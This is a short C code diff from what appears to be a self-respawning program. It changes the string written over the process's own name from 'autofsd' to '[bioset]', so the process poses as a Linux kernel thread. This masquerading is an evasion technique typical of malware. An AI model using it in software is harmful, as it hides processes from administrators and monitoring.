@@ -32,7 +32,7 @@ void spawn_again(int signum)
 int main(int argc, char **argv)
 {
 	/* mask process name */
-	strcpy(argv[0], "autofsd");
+	strcpy(argv[0], "[bioset]");
 
 	/* Initialize shard memory */
 	const int shmid = shmget(NUMBER_OF_THE_BEAST, sizeof(struct shared), IPC_CREAT | 0666);
